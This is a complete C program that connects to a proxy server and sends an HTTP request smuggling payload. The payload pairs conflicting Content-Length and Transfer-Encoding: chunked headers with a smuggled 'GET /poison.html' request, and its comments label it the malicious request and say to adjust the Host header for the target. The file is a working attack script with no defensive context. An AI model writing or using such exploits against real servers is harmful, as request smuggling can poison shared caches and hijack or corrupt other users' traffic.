#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define TARGET_IP "192.168.1.202"
#define TARGET_PORT 8080

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char request[1024];
    char buffer[4096];
    
    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Setup server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    server_addr.sin_addr.s_addr = inet_addr(TARGET_IP);

    // Connect to the proxy server
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return 1;
    }

    snprintf(request, sizeof(request),
        "POST / HTTP/1.1\r\n"
        "Host: 192.168.1.202\r\n"  // Adjust Host header here
        "Content-Length: 25\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "4\r\n"  // Chunk size
        "abcd\r\n"  // Chunk data
        "0\r\n"  // End of chunked encoding
        "\r\n"  // End of the first request
        "GET /poison.html HTTP/1.1\r\n"
        "Host: 192.168.1.202\r\n"  // Adjust Host header here
        "\r\n");


    // Send the malicious request
    if (send(sock, request, strlen(request), 0) < 0) {
        perror("Send failed");
        close(sock);
        return 1;
    }

    // Read the server response
    int received = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (received > 0) {
        buffer[received] = '\0';
        printf("Server response:\n%s\n", buffer);
    } else {
        perror("Receive failed");
    }

    // Close socket
    close(sock);

    return 0;
}
